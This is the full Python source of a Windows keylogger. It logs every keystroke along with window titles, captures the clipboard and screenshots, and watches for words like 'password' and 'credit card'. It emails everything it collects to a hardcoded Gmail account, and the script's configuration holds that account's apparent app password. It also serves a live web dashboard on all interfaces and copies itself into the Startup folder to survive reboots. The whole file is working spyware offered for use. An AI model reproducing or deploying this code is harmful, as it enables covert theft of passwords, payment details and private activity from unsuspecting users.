import pythoncom
import pyWinhook as pyHook
import win32clipboard
import win32gui
import time
import threading
import smtplib
import os
import sys
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from PIL import ImageGrab
from flask import Flask, jsonify, send_file

# ========== Configuration ==========
KEYWORDS = ["password", "credit card"]
EMAIL = "nafiaku447@gmail.com"
PASSWORD = "gwqwccuzmfwemsxb"
INTERVAL = 60          # seconds between email reports
MAX_LOG_LINES = 300    # auto-send when keylog exceeds this
WEB_PORT = 5000        # dashboard port

# ========== Global State ==========
keylogs = []
clipboard_data = []
screenshots = []
window_log = []
force_send = False

# Screenshot directory
SCREENSHOT_DIR = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), "screenshots")
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

# ========== Key Filtering ==========
MODIFIERS = {
    'Lshift', 'Rshift', 'Lcontrol', 'Rcontrol',
    'Lmenu', 'Rmenu', 'Lwin', 'Rwin', 'Capital',
    'Numlock', 'Scroll', 'Oem_clear',
}

SPECIALS = {
    'Return': '[ENTER]\n',
    'Space': ' ',
    'Back': '[⌫]',
    'Delete': '[⌦]',
    'Tab': '\t',
    'Escape': '[ESC]',
    'Left': '[←]', 'Right': '[→]',
    'Up': '[↑]', 'Down': '[↓]',
    'Prior': '[PgUp]', 'Next': '[PgDn]',
    'Home': '[Home]', 'End': '[End]',
    'Insert': '[Ins]',
}

F_KEYS = {f'F{i}' for i in range(1, 13)}

# ========== Keylogger Core ==========
def get_active_window():
    try:
        hwnd = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(hwnd)
    except:
        return "Unknown"

def on_keyboard_event(event):
    global keylogs, window_log, force_send

    if event.Key in MODIFIERS:
        return True

    # Detect window change
    current = get_active_window()
    last = window_log[-1] if window_log else ''
    if current and current != last:
        window_log.append(current)
        keylogs.append(f'\n═══ {current} ═══\n')

    # Format key
    if event.Key in SPECIALS:
        keylogs.append(SPECIALS[event.Key])
    elif event.Key in F_KEYS:
        keylogs.append(f'[{event.Key}]')
    elif event.Ascii and 32 <= event.Ascii <= 126:
        keylogs.append(chr(event.Ascii))
    # else: skip unknown/weird keys

    # Size check
    if len(keylogs) > MAX_LOG_LINES:
        force_send = True

    return True

def on_clipboard_change():
    global clipboard_data
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
        text = data.decode('latin-1').strip()
        if text and (not clipboard_data or text != clipboard_data[-1]):
            clipboard_data.append(text)
        win32clipboard.CloseClipboard()
    except:
        pass

def capture_screenshot():
    global screenshots
    filename = f"ss_{int(time.time())}.png"
    filepath = os.path.join(SCREENSHOT_DIR, filename)
    screenshot = ImageGrab.grab()
    screenshot.save(filepath)
    screenshots.append(filename)

def check_keywords(text):
    for keyword in KEYWORDS:
        if keyword.lower() in text.lower():
            return True
    return False


# ========== Email Reporter ==========
def send_report():
    global keylogs, clipboard_data, screenshots
    if not keylogs and not clipboard_data and not screenshots:
        return

    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL
        msg['To'] = EMAIL
        msg['Subject'] = "Keylogger Report"

        body = "=== Keylogs ===\n"
        body += "".join(keylogs).strip() or "(empty)"
        body += "\n\n=== Clipboard ===\n"
        body += "\n---\n".join(clipboard_data).strip() or "(empty)"
        msg.attach(MIMEText(body, 'plain'))

        for ss in screenshots:
            path = os.path.join(SCREENSHOT_DIR, ss)
            if os.path.exists(path):
                with open(path, "rb") as f:
                    msg.attach(MIMEImage(f.read(), name=ss))

        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(EMAIL, PASSWORD)
        server.sendmail(EMAIL, EMAIL, msg.as_string())
        server.quit()

        # Clean old screenshots
        for ss in screenshots:
            path = os.path.join(SCREENSHOT_DIR, ss)
            try:
                os.remove(path)
            except:
                pass

        print(f"[{time.strftime('%H:%M:%S')}] Report sent — {len(keylogs)} keys, {len(clipboard_data)} clipboard, {len(screenshots)} screenshots.")

    except Exception as e:
        print(f"[!] Send failed: {e}")
        return  # don't clear if send failed

    keylogs.clear()
    clipboard_data.clear()
    screenshots.clear()


# ========== Hook Thread ==========
def keyboard_hook_thread():
    pythoncom.CoInitialize()
    hm = pyHook.HookManager()
    hm.KeyDown = on_keyboard_event
    hm.HookKeyboard()
    pythoncom.PumpMessages()


# ========== Web Dashboard ==========
app = Flask(__name__)

DASHBOARD_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Keylogger Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',sans-serif;padding:20px}
h1{color:#58a6ff;margin-bottom:10px;font-size:22px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-top:20px}
.card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px}
.card h2{color:#f78166;font-size:15px;margin-bottom:10px;border-bottom:1px solid #30363d;padding-bottom:8px}
pre{background:#0d1117;padding:12px;border-radius:6px;font-size:12px;font-family:'Cascadia Code','Fira Code',monospace;white-space:pre-wrap;word-break:break-all;max-height:400px;overflow-y:auto;line-height:1.5}
.imgs{display:flex;flex-wrap:wrap;gap:8px}
.imgs img{max-width:250px;border-radius:4px;border:1px solid #30363d}
.badge{display:inline-block;background:#238636;color:white;padding:2px 10px;border-radius:12px;font-size:11px;margin-right:6px}
.topbar{display:flex;align-items:center;gap:16px}
.topbar span{color:#8b949e;font-size:12px}
</style>
</head>
<body>
<div class="topbar">
  <h1>⌨️ Keylogger Dashboard</h1>
  <span class="badge" id="status">live</span>
  <span id="time"></span>
</div>
<div class="grid">
  <div class="card">
    <h2>📝 Keylogs</h2>
    <pre id="keylogs">Loading...</pre>
  </div>
  <div class="card">
    <h2>📋 Clipboard</h2>
    <pre id="clipboard">Loading...</pre>
  </div>
  <div class="card">
    <h2>🪟 Active Windows</h2>
    <pre id="windows">Loading...</pre>
  </div>
  <div class="card">
    <h2>📸 Screenshots</h2>
    <div class="imgs" id="screenshots">Loading...</div>
  </div>
</div>
<script>
async function refresh(){
try{
const r=await fetch('/api/data');
const d=await r.json();
document.getElementById('keylogs').textContent=d.keylogs||'(empty)';
document.getElementById('clipboard').textContent=d.clipboard||'(empty)';
document.getElementById('windows').textContent=d.windows||'(empty)';
document.getElementById('screenshots').innerHTML=d.screenshots.map(s=>`<a href="/screenshot/${s}" target="_blank"><img src="/screenshot/${s}"></a>`).join('')||'(none)';
document.getElementById('time').textContent=new Date().toLocaleTimeString();
document.getElementById('status').style.background=d.alive?'#238636':'#da3633';
}catch(e){document.getElementById('status').style.background='#da3633'}
}
setInterval(refresh,5000);
refresh();
</script>
</body>
</html>
"""

@app.route('/')
def dashboard():
    return DASHBOARD_HTML

@app.route('/api/data')
def api_data():
    return jsonify({
        'keylogs': ''.join(keylogs).strip() or '(empty)',
        'clipboard': '\n---\n'.join(clipboard_data) or '(empty)',
        'windows': '\n'.join(window_log[-20:]) or '(empty)',
        'screenshots': screenshots,
        'alive': True,
    })

@app.route('/screenshot/<filename>')
def serve_screenshot(filename):
    path = os.path.join(SCREENSHOT_DIR, filename)
    if os.path.exists(path):
        return send_file(path, mimetype='image/png')
    return 'not found', 404

def start_web():
    print(f"[*] Dashboard → http://localhost:{WEB_PORT}")
    app.run(host='0.0.0.0', port=WEB_PORT, debug=False, use_reloader=False)


# ========== Persistence ==========
def create_persistence():
    import shutil
    import win32com.client

    filename = os.path.abspath(sys.argv[0])
    startup_folder = os.path.expanduser("~") + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    shutil.copy(filename, startup_folder)

    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(startup_folder + r"\keylogger.lnk")
    shortcut.TargetPath = filename
    shortcut.save()


# ========== Main Controller ==========
def main_loop():
    global force_send

    while True:
        for _ in range(INTERVAL):
            time.sleep(1)
            if force_send or len(keylogs) > MAX_LOG_LINES:
                break

        capture_screenshot()
        on_clipboard_change()

        kw = check_keywords("".join(keylogs))
        if kw:
            print("[!] Keyword detected!")
            capture_screenshot()

        send_report()
        force_send = False


# ========== Entry Point ==========
if __name__ == '__main__':
    # Persistence
    try:
        create_persistence()
        print("[*] Added to startup.")
    except:
        print("[!] Not admin — skipping startup persistence.")

    # Start keyboard hook
    threading.Thread(target=keyboard_hook_thread, daemon=True).start()

    # Start web dashboard
    threading.Thread(target=start_web, daemon=True).start()

    print("[*] Keylogger running...")
    main_loop()
